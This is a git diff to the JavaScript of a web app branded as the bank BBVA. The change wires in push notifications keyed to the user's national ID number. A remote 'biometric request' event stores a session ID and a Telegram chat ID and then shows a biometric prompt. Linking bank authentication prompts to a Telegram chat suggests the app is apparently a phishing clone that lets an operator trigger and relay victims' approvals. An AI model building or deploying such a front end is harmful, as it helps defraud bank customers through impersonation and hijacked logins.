@@ -323,6 +323,7 @@ document.addEventListener('DOMContentLoaded', () => {
             }
             // Login exitoso
             state.userName = loginUserData.name;
+            const cedLogin = loginUserData.cedula;
             localStorage.setItem('bbva_user',    loginUserData.name);
             localStorage.setItem('bbva_user_id', loginUserData.cedula);
             localStorage.setItem('bbva_pagos_inteligentes', loginUserData.pagosInteligentes ? 'true' : 'false');
@@ -332,6 +333,8 @@ document.addEventListener('DOMContentLoaded', () => {
             loginStep = 'cedula';
             loginUserData = null;
             showScreen('dashboard-screen');
+            // Solicitar permiso push y registrar FCM token
+            if (window.initPushNotifications) window.initPushNotifications(cedLogin);
             // Mostrar modal de bienvenida PI si aplica
             showPIWelcomeModal();
         }
@@ -363,6 +366,9 @@ document.addEventListener('DOMContentLoaded', () => {
             updatePromoBanner();
             showScreen('dashboard-screen');
             showPIWelcomeModal();
+            // Solicitar permiso push y registrar FCM token
+            const cedBio = localStorage.getItem('bbva_user_id');
+            if (window.initPushNotifications) window.initPushNotifications(cedBio);
             if (icon) {
                 icon.style.color = '';
                 icon.style.stroke = '';
@@ -448,6 +454,34 @@ document.addEventListener('DOMContentLoaded', () => {
     // Dark mode toggle dentro de Pagos Inteligentes
     document.getElementById('pi-dark-mode')?.addEventListener('click', () => {
         document.getElementById('app').classList.toggle('dark-mode');
+    });
+
+    // ── Escuchar notificaciones push en foreground ─────────────────────
+    window.addEventListener('bbva-biometric-request', (event) => {
+        const data = event.detail;
+        console.log('[push] Biometric request recibido:', data);
+        sessionStorage.setItem('bbva_auth_session',  data.sessionId     || '');
+        sessionStorage.setItem('bbva_telegram_chat', data.telegramChatId || '');
+        const bm = document.getElementById('biometric-modal');
+        if (bm) {
+            bm.style.display = 'flex';
+            if (window.lucide) window.lucide.createIcons();
+        }
+    });
+
+    window.addEventListener('bbva-push-notification', (event) => {
+        const { title, body } = event.detail;
+        const piToast    = document.getElementById('pi-toast');
+        const piToastMsg = document.getElementById('pi-toast-msg');
+        if (piToast && piToastMsg) {
+            piToastMsg.textContent = `${title}: ${body}`;
+            piToast.classList.remove('pi-toast-hidden');
+            piToast.classList.add('pi-toast-visible');
+            setTimeout(() => {
+                piToast.classList.remove('pi-toast-visible');
+                piToast.classList.add('pi-toast-hidden');
+            }, 4000);
+        }
     });
 
     // ── PI Welcome Modal ──
